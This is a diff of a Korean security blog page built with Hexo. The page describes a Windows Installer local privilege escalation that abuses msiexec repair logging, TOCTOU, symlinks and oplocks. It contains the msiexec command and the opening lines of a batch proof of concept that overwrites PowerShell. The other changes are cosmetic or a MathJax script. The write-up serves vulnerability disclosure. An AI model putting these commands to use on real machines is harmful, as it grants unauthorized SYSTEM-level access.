@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      153 자
+      242 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      4
        분
     </span>
   
@@ -244,10 +244,10 @@
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
 <li>Microsoft Windows Installer</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows Installer(MSI)에서 TOCTOU와 symlink를 통한 Local Privilege Escalation 취약점이 발견되었습니다. <code>msiexec</code>는 기본적으로 관리자 권한을 필요로 하지만 repair operation 수행을 위해 <code>/f</code> 옵션을 사용하면 권한이 없이 사용할 수 있습니다. <code>/L</code> 옵션과 함께 사용하면 로그 파일을 지정된 곳에 생성할 수 있습니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows Installer(MSI)&#xC5D0;&#xC11C; TOCTOU&#xC640; symlink&#xB97C; &#xD1B5;&#xD55C; Local Privilege Escalation &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. <code>msiexec</code>&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xD544;&#xC694;&#xB85C; &#xD558;&#xC9C0;&#xB9CC; repair operation &#xC218;&#xD589;&#xC744; &#xC704;&#xD574; <code>/f</code> &#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xC774; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>/L</code> &#xC635;&#xC158;&#xACFC; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB85C;&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xC9C0;&#xC815;&#xB41C; &#xACF3;&#xC5D0; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs taggerscript">msiexec /f C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\I</span>nstaller<span class="hljs-symbol">\1</span>48d3c4.msi /L C:<span class="hljs-symbol">\t</span>emp<span class="hljs-symbol">\f</span>oo.log</code></pre>
 
-<p>symlink를 통해 <code>foo.log</code>가 첫 CreatFile에서 시스템 권한으로 impersnation 될 때 oplock을 설치하면 다음 쓰기/읽기 작업은 심볼릭 링크된 파일에서 수행됩니다. PowerShell을 Overwrite하여 LPE를 하는 POC는 다음과 같습니다.</p>
+<p>symlink&#xB97C; &#xD1B5;&#xD574; <code>foo.log</code>&#xAC00; &#xCCAB; CreatFile&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; impersnation &#xB420; &#xB54C; oplock&#xC744; &#xC124;&#xCE58;&#xD558;&#xBA74; &#xB2E4;&#xC74C; &#xC4F0;&#xAE30;/&#xC77D;&#xAE30; &#xC791;&#xC5C5;&#xC740; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB41C; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. PowerShell&#xC744; Overwrite&#xD558;&#xC5EC; LPE&#xB97C; &#xD558;&#xB294; POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs latex">@echo off
 REM Put BaitAndSwitch, example.msi into C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span>
 echo &gt; C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">fakelog</span></span>.txt
@@ -272,9 +272,9 @@ msiexec /j C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
-                  
                   <a class="hover-with-bg" href="/tags/lpe/">lpe</a>
+                  
+                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
                   
                   <a class="hover-with-bg" href="/tags/toctou/">toctou</a>
                   
@@ -559,6 +559,45 @@ msiexec /j C:<span class="hljs-tag">\<span class="hljs-name">temp</span></span><
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
